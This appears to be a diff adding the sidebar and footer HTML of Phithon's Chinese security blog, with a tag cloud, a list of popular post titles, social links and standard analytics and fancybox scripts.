+        <a rel="tag" href="../tag/Docker.html">Docker</a>
+        
+        <a rel="tag" href="../tag/%E6%8A%A5%E7%BA%B8.html">报纸</a>
+        
+        <a rel="tag" href="../tag/2019.html">2019</a>
+        
+        <a rel="tag" href="../tag/string.html">string</a>
+        
+        <a rel="tag" href="../tag/Vulhub.html">Vulhub</a>
+        
+        <a rel="tag" href="../tag/%E5%BA%93%E5%87%BD%E6%95%B0.html">库函数</a>
+        
+        <a rel="tag" href="../tag/CSRF%E6%BC%8F%E6%B4%9E.html">CSRF漏洞</a>
+        
+        <a rel="tag" href="../tag/%E5%8A%A0%E5%AF%86.html">加密</a>
+        
+        <a rel="tag" href="../tag/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.html">端口转发</a>
+        
+        <a rel="tag" href="../tag/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE.html">开源项目</a>
+        
+        <a rel="tag" href="../tag/ipv6.html">ipv6</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="../PENETRATION/detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="../PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="../PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="../PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
